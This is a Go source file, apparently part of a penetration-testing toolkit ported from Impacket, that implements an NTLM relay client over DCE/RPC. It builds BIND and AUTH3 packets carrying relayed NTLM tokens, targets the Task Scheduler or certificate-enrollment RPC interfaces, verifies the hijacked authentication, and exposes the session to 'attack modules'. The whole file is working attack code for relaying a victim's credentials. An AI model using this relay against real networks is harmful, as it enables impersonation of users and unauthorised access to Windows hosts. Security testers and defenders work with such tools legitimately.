// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package relay

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"net"

	"gopacket/internal/build"
	"gopacket/pkg/dcerpc"
	"gopacket/pkg/dcerpc/epmapper"
	"gopacket/pkg/dcerpc/header"
	"gopacket/pkg/dcerpc/tsch"
	"gopacket/pkg/transport"
)

// ICPR interface UUID: 91ae6020-9e3c-11cf-8d7c-00aa00c091be v0.0
var icprUUID = [16]byte{
	0x20, 0x60, 0xae, 0x91, 0x3c, 0x9e, 0xcf, 0x11,
	0x8d, 0x7c, 0x00, 0xaa, 0x00, 0xc0, 0x91, 0xbe,
}

const (
	rpcAuthLevelConnect = 2     // RPC_C_AUTHN_LEVEL_CONNECT
	rpcAuthCtxIDRelay   = 79231 // Matches Impacket's auth_ctx_id
)

// RPC fault status codes
const (
	rpcFaultOpRngError = 0x1C010002 // nca_s_op_rng_error — invalid opnum, but auth OK
)

// RPCRelaySession holds the authenticated DCE/RPC session for attack modules.
type RPCRelaySession struct {
	Client *dcerpc.Client
	Mode   string // "TSCH" or "ICPR"
}

// RPCRelayClient relays NTLM authentication over DCE/RPC BIND/AUTH3.
// Connects to the target's endpoint mapper to resolve the dynamic TCP port,
// then performs NTLM relay via the BIND/AUTH3 handshake.
// Matches Impacket's rpcrelayclient.py.
type RPCRelayClient struct {
	targetAddr    string // host:port from target entry
	rpcMode       string // "TSCH" or "ICPR"
	endpointUUID  [16]byte
	endpointMajor uint16
	endpointMinor uint16
	conn          net.Conn
	rpcTransport  *dcerpc.TCPTransport
	callID        uint32
	dceClient     *dcerpc.Client
}

// NewRPCRelayClient creates a new RPC relay client.
func NewRPCRelayClient(targetAddr, rpcMode string) *RPCRelayClient {
	return &RPCRelayClient{
		targetAddr: targetAddr,
		rpcMode:    rpcMode,
		callID:     1,
	}
}

// InitConnection resolves the endpoint via epmapper and connects to the dynamic port.
func (c *RPCRelayClient) InitConnection() error {
	// Determine endpoint UUID based on mode
	switch c.rpcMode {
	case "ICPR":
		c.endpointUUID = icprUUID
		c.endpointMajor = 0
		c.endpointMinor = 0
	default: // TSCH
		c.endpointUUID = tsch.UUID
		c.endpointMajor = tsch.MajorVersion
		c.endpointMinor = tsch.MinorVersion
	}

	host := stripPort(c.targetAddr)

	// Resolve dynamic TCP port via endpoint mapper (port 135)
	port, err := epmapper.MapTCPEndpoint(host, c.endpointUUID, c.endpointMajor)
	if err != nil {
		return fmt.Errorf("epmapper resolve %s: %v", c.rpcMode, err)
	}

	if build.Debug {
		log.Printf("[D] RPC relay: %s endpoint resolved to %s:%d", c.rpcMode, host, port)
	}

	// Connect to the dynamic port (no deadline — relay handshake can take time)
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := transport.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("connect to %s: %v", addr, err)
	}
	c.conn = conn
	c.rpcTransport = dcerpc.NewTCPTransport(conn)

	log.Printf("[*] RPC relay: connected to %s (%s on port %d)", host, c.rpcMode, port)

	return nil
}

// SendNegotiate sends a BIND with NTLM Type1 and returns the Type2 challenge.
func (c *RPCRelayClient) SendNegotiate(ntlmType1 []byte) ([]byte, error) {
	if build.Debug {
		log.Printf("[D] RPC relay: sending BIND with Type1 (%d bytes)", len(ntlmType1))
	}

	// Build and send BIND packet with NTLM Type1 in sec_trailer
	bindPkt := c.buildBind(ntlmType1)
	if _, err := c.conn.Write(bindPkt); err != nil {
		return nil, fmt.Errorf("send BIND: %v", err)
	}

	// Receive BIND_ACK
	pdu, err := rpcRecvPDU(c.conn)
	if err != nil {
		return nil, fmt.Errorf("recv BIND_ACK: %v", err)
	}

	if len(pdu) < 16 {
		return nil, fmt.Errorf("BIND_ACK too short: %d bytes", len(pdu))
	}

	var hdr rpcCommonHeader
	binary.Read(bytes.NewReader(pdu[:16]), binary.LittleEndian, &hdr)

	if hdr.PacketType == rpcPktBindNak {
		return nil, fmt.Errorf("BIND rejected (BIND_NAK)")
	}
	if hdr.PacketType != rpcPktBindAck {
		return nil, fmt.Errorf("expected BIND_ACK (%d), got type %d", rpcPktBindAck, hdr.PacketType)
	}

	// Extract Type2 from auth_data in BIND_ACK
	if hdr.AuthLength == 0 {
		return nil, fmt.Errorf("BIND_ACK has no auth data")
	}

	secTrailerOff := int(hdr.FragLength) - int(hdr.AuthLength) - 8
	if secTrailerOff < 16 || secTrailerOff+8+int(hdr.AuthLength) > len(pdu) {
		return nil, fmt.Errorf("invalid BIND_ACK auth layout (frag=%d, auth=%d)", hdr.FragLength, hdr.AuthLength)
	}

	type2 := make([]byte, hdr.AuthLength)
	copy(type2, pdu[secTrailerOff+8:secTrailerOff+8+int(hdr.AuthLength)])

	if build.Debug {
		log.Printf("[D] RPC relay: got Type2 challenge (%d bytes) from BIND_ACK", len(type2))
	}

	return type2, nil
}

// SendAuth sends AUTH3 with NTLM Type3 and verifies authentication via DummyOp.
func (c *RPCRelayClient) SendAuth(ntlmType3 []byte) error {
	// Unwrap SPNEGO if present (SMB wraps Type3 in SPNEGO, RPC expects raw NTLM)
	type3 := unwrapSPNEGOType3(ntlmType3)

	if build.Debug {
		log.Printf("[D] RPC relay: sending AUTH3 with Type3 (%d bytes)", len(type3))
	}

	// Build and send AUTH3 packet
	auth3Pkt := c.buildAuth3(type3)
	if _, err := c.conn.Write(auth3Pkt); err != nil {
		return fmt.Errorf("send AUTH3: %v", err)
	}

	// AUTH3 has no response per spec. Verify by sending DummyOp (opnum 255).
	// nca_s_op_rng_error = auth succeeded, rpc_s_access_denied = auth failed.
	if err := c.verifyAuth(); err != nil {
		return err
	}

	// Create dcerpc.Client on the same transport for attack modules.
	// Pre-populate Contexts so Call() uses the correct context ID (0).
	c.dceClient = &dcerpc.Client{
		Transport: c.rpcTransport,
		CallID:    c.callID,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  map[[16]byte]uint16{c.endpointUUID: 0},
		ContextID: 0,
	}

	if build.Debug {
		log.Printf("[D] RPC relay: auth verified, dcerpc.Client created")
	}

	return nil
}

// GetSession returns the RPCRelaySession for attack modules.
func (c *RPCRelayClient) GetSession() interface{} {
	if c.dceClient == nil {
		return nil
	}
	return &RPCRelaySession{
		Client: c.dceClient,
		Mode:   c.rpcMode,
	}
}

// KeepAlive sends a heartbeat to prevent session timeout.
func (c *RPCRelayClient) KeepAlive() error {
	// RPC sessions over TCP don't typically time out.
	// If needed, could send DummyOp but that would use the raw conn
	// which conflicts with dcerpc.Client's usage.
	return nil
}

// Kill terminates the connection.
func (c *RPCRelayClient) Kill() {
	if c.conn != nil {
		c.conn.Close()
	}
}

// IsAdmin returns true — RPC relay auth implies access to the endpoint.
func (c *RPCRelayClient) IsAdmin() bool {
	return true
}

// verifyAuth sends a dummy REQUEST (opnum 255) and checks the FAULT response.
// nca_s_op_rng_error (0x1C010002) = success, rpc_s_access_denied (0x00000005) = failure.
// Matches Impacket's rpcrelayclient.py sendAuth verification.
func (c *RPCRelayClient) verifyAuth() error {
	// Build REQUEST packet for opnum 255 (non-existent)
	reqPkt := c.buildRequest(255, nil)
	if _, err := c.conn.Write(reqPkt); err != nil {
		return fmt.Errorf("send verify request: %v", err)
	}

	// Read FAULT response
	pdu, err := rpcRecvPDU(c.conn)
	if err != nil {
		return fmt.Errorf("recv verify response: %v", err)
	}

	if len(pdu) < 16 {
		return fmt.Errorf("verify response too short: %d bytes", len(pdu))
	}

	var hdr rpcCommonHeader
	binary.Read(bytes.NewReader(pdu[:16]), binary.LittleEndian, &hdr)

	if hdr.PacketType != rpcPktFault {
		return fmt.Errorf("expected FAULT (%d), got type %d", rpcPktFault, hdr.PacketType)
	}

	// FAULT PDU body: AllocHint(4) + ContextID(2) + CancelCount(1) + Reserved(1) + Status(4)
	// Status is at offset 16 + 4 + 2 + 1 + 1 = 24
	if len(pdu) < 28 {
		return fmt.Errorf("FAULT too short for status: %d bytes", len(pdu))
	}

	status := binary.LittleEndian.Uint32(pdu[24:28])

	if status == rpcFaultOpRngError {
		// nca_s_op_rng_error = invalid opnum but auth succeeded
		return nil
	}

	if status == rpcStatusAccessDenied {
		return fmt.Errorf("authentication failed (rpc_s_access_denied)")
	}

	return fmt.Errorf("unexpected fault status: 0x%08X", status)
}

// buildBind constructs a BIND packet with NTLM token in sec_trailer.
// Includes one presentation context item for the endpoint interface + NDR transfer syntax.
func (c *RPCRelayClient) buildBind(ntlmToken []byte) []byte {
	// Build presentation context item (44 bytes)
	var ctxItem bytes.Buffer
	binary.Write(&ctxItem, binary.LittleEndian, uint16(0)) // ContextID = 0
	ctxItem.WriteByte(1)                                   // NumTransItems = 1
	ctxItem.WriteByte(0)                                   // Reserved
	// Abstract syntax: UUID(16) + Version(2+2)
	ctxItem.Write(c.endpointUUID[:])
	binary.Write(&ctxItem, binary.LittleEndian, c.endpointMajor)
	binary.Write(&ctxItem, binary.LittleEndian, c.endpointMinor)
	// Transfer syntax: NDR UUID(16) + Version(4)
	ctxItem.Write(header.TransferSyntaxNDR[:])
	binary.Write(&ctxItem, binary.LittleEndian, uint32(2)) // NDR v2.0

	// Build BIND body
	var body bytes.Buffer
	binary.Write(&body, binary.LittleEndian, uint16(4280)) // MaxXmitFrag
	binary.Write(&body, binary.LittleEndian, uint16(4280)) // MaxRecvFrag
	binary.Write(&body, binary.LittleEndian, uint32(0))    // AssocGroup
	body.WriteByte(1)                                      // NumCtxItems
	body.Write([]byte{0, 0, 0})                            // Reserved (3 bytes)
	body.Write(ctxItem.Bytes())

	bodyBytes := body.Bytes()

	// Pad body to 4-byte alignment for sec_trailer
	pad := (4 - (len(bodyBytes) % 4)) % 4
	for i := 0; i < pad; i++ {
		bodyBytes = append(bodyBytes, 0)
	}

	// Security trailer (8 bytes)
	var secTrailer bytes.Buffer
	secTrailer.WriteByte(rpcAuthWinNT)        // auth_type = 10 (NTLMSSP)
	secTrailer.WriteByte(rpcAuthLevelConnect) // auth_level = 2 (CONNECT)
	secTrailer.WriteByte(byte(pad))           // auth_pad_len
	secTrailer.WriteByte(0)                   // reserved
	binary.Write(&secTrailer, binary.LittleEndian, uint32(rpcAuthCtxIDRelay))

	authLen := uint16(len(ntlmToken))
	fragLen := uint16(16 + len(bodyBytes) + 8 + len(ntlmToken))

	// Build complete packet
	var pkt bytes.Buffer
	// Common header (16 bytes)
	binary.Write(&pkt, binary.LittleEndian, uint8(5))          // MajorVersion
	binary.Write(&pkt, binary.LittleEndian, uint8(0))          // MinorVersion
	binary.Write(&pkt, binary.LittleEndian, uint8(rpcPktBind)) // PacketType
	binary.Write(&pkt, binary.LittleEndian, uint8(0x03))       // Flags: PFC_FIRST_FRAG | PFC_LAST_FRAG
	pkt.Write([]byte{0x10, 0x00, 0x00, 0x00})                  // DataRep: LE, ASCII, IEEE
	binary.Write(&pkt, binary.LittleEndian, fragLen)
	binary.Write(&pkt, binary.LittleEndian, authLen)
	binary.Write(&pkt, binary.LittleEndian, c.callID)
	c.callID++

	// Body + sec_trailer + auth_data
	pkt.Write(bodyBytes)
	pkt.Write(secTrailer.Bytes())
	pkt.Write(ntlmToken)

	return pkt.Bytes()
}

// buildAuth3 constructs an AUTH3 packet with NTLM token in sec_trailer.
// AUTH3 body is just 4 bytes (max_xmit_frag(2) + max_recv_frag(2), both 0).
// Matches Impacket's MSRPCAuth3 packet format.
func (c *RPCRelayClient) buildAuth3(ntlmToken []byte) []byte {
	// AUTH3 body: 4 bytes (MaxXmitFrag=0 + MaxRecvFrag=0)
	bodyPad := []byte{0x00, 0x00, 0x00, 0x00}

	// Security trailer
	var secTrailer bytes.Buffer
	secTrailer.WriteByte(rpcAuthWinNT)
	secTrailer.WriteByte(rpcAuthLevelConnect)
	secTrailer.WriteByte(0) // auth_pad_len (body is 4 bytes = aligned)
	secTrailer.WriteByte(0) // reserved
	binary.Write(&secTrailer, binary.LittleEndian, uint32(rpcAuthCtxIDRelay))

	authLen := uint16(len(ntlmToken))
	fragLen := uint16(16 + len(bodyPad) + 8 + len(ntlmToken))

	var pkt bytes.Buffer
	// Common header
	binary.Write(&pkt, binary.LittleEndian, uint8(5))
	binary.Write(&pkt, binary.LittleEndian, uint8(0))
	binary.Write(&pkt, binary.LittleEndian, uint8(rpcPktAuth3))
	binary.Write(&pkt, binary.LittleEndian, uint8(0x03)) // first+last
	pkt.Write([]byte{0x10, 0x00, 0x00, 0x00})            // DataRep
	binary.Write(&pkt, binary.LittleEndian, fragLen)
	binary.Write(&pkt, binary.LittleEndian, authLen)
	binary.Write(&pkt, binary.LittleEndian, c.callID)
	c.callID++

	// Body + sec_trailer + auth_data
	pkt.Write(bodyPad)
	pkt.Write(secTrailer.Bytes())
	pkt.Write(ntlmToken)

	return pkt.Bytes()
}

// buildRequest constructs a DCE/RPC REQUEST packet (no auth).
func (c *RPCRelayClient) buildRequest(opNum uint16, stubData []byte) []byte {
	stubLen := len(stubData)
	fragLen := uint16(16 + 8 + stubLen) // header + request header + stub

	var pkt bytes.Buffer
	// Common header
	binary.Write(&pkt, binary.LittleEndian, uint8(5))
	binary.Write(&pkt, binary.LittleEndian, uint8(0))
	binary.Write(&pkt, binary.LittleEndian, uint8(rpcPktRequest))
	binary.Write(&pkt, binary.LittleEndian, uint8(0x03)) // first+last
	pkt.Write([]byte{0x10, 0x00, 0x00, 0x00})            // DataRep
	binary.Write(&pkt, binary.LittleEndian, fragLen)
	binary.Write(&pkt, binary.LittleEndian, uint16(0)) // auth_length = 0
	binary.Write(&pkt, binary.LittleEndian, c.callID)
	c.callID++

	// Request header: AllocHint(4) + ContextID(2) + OpNum(2)
	binary.Write(&pkt, binary.LittleEndian, uint32(stubLen))
	binary.Write(&pkt, binary.LittleEndian, uint16(0)) // context_id
	binary.Write(&pkt, binary.LittleEndian, opNum)

	// Stub data
	if stubLen > 0 {
		pkt.Write(stubData)
	}

	return pkt.Bytes()
}
